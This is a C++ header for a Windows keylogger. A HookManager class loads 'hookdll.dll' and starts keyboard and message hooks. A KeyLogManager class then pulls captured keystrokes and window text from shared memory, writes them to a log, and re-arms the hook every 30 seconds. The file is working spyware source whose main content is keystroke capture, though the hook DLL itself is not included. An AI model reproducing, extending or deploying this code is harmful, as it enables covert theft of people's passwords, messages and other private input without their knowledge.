#pragma once
#include "tool.h"

class HookManager
{
	typedef bool (*HOOK_FN)();
	SharedMemory sm;
	HMODULE lib;
	HOOK_FN start_message_hook_fn;
	HOOK_FN stop_message_hook_fn;
	HOOK_FN start_keyboard_hook_fn;
	HOOK_FN stop_keyboard_hook_fn;
public:
	HookManager() : sm("hook_area"){
	}
	~HookManager(){
		FreeLibrary(lib);
		sm.destroy();
	}
	static bool get_dll_path(char* path){
		char dll_path[MAX_PATH];
		GetModuleFileName(NULL, dll_path, sizeof(dll_path));
		char *pos = strrchr(dll_path, '\\');
		if(pos == NULL)
			return false;
		strcpy(pos, "\\\0\0");
		strcat(dll_path, "hookdll.dll");
		strcpy(path, dll_path);
		return true;
	}
	bool init(){
		char path[MAX_PATH];
		if(!get_dll_path(path)){
			return false;
		}
		lib = LoadLibrary(path);
		if(!lib){
			return false;
		}
		(FARPROC &)start_message_hook_fn = GetProcAddress(lib, "start_message_hook");
		(FARPROC &)stop_message_hook_fn = GetProcAddress(lib, "stop_message_hook");
		(FARPROC &)start_keyboard_hook_fn = GetProcAddress(lib, "start_keyboard_hook");
		(FARPROC &)stop_keyboard_hook_fn = GetProcAddress(lib, "stop_keyboard_hook");
		if(!start_message_hook_fn || !stop_message_hook_fn || 
			!start_keyboard_hook_fn || !stop_keyboard_hook_fn){
				return false;
		}
		return true;
	}
	bool start_message_hook(){
		return start_message_hook_fn();
	}
	bool stop_message_hook(){
		return stop_message_hook_fn();
	}
	bool start_keyboard_hook(){
		return start_keyboard_hook_fn();
	}
	bool stop_keyboard_hook(){
		return stop_keyboard_hook_fn();
	}
};

class KeyLogManager
{
	HookManager hm;
	SharedMemory sm;
public:
	KeyLogManager(void):sm("hook_area"){
	}
	~KeyLogManager(void){
	}
	void start(){
		if(!sm.create(sizeof(int) + 128)){
			perror("Create SM Fail");
			exit(1);
		}
		sm.write_int(GetCurrentThreadId());
		if(!hm.init()){
			perror("Init Fail");
			exit(1);
		}
		hm.start_keyboard_hook();
		hm.start_message_hook();

		MSG msg;
		time_t last_time = time(NULL);
		while(true) {
			bool ret = PeekMessage(&msg, NULL, WM_MESSAGE_HOOK, WM_KEYBOARD_HOOK, PM_REMOVE);
			if(ret){
				switch(msg.message){
				case WM_MESSAGE_HOOK:
					log_message(msg);
					break;
				case WM_KEYBOARD_HOOK:
					log_keyboard(msg);
					break;
				default:
					break;
				}
			}
			time_t cur_time = time(NULL);
			if(difftime(cur_time, last_time) > 30){
				hm.start_message_hook();
				last_time = cur_time;
			}
			Sleep(1);
		}
	}
	void log_message(MSG& msg)
	{
		char str[128] = {0};
		sm.read_mem(str, sizeof(int), sizeof(str));
		str[sizeof(str) - 1] = 0;
		str[sizeof(str) - 2] = 0;
		Logger::debug("<%s>", str);
		Logger::write("<%s>", str);
	}
	void log_keyboard(MSG& msg)
	{
		char str[20] = {0};
		sm.read_mem(str, sizeof(int), sizeof(str));
		str[sizeof(str) - 1] = 0;
		if(str[1] != 0){
			Logger::debug("[%s]", str);
			Logger::write("[%s]", str);
		} else{
			Logger::debug("%s", str);
			Logger::write("%s", str);
		}
	}
};

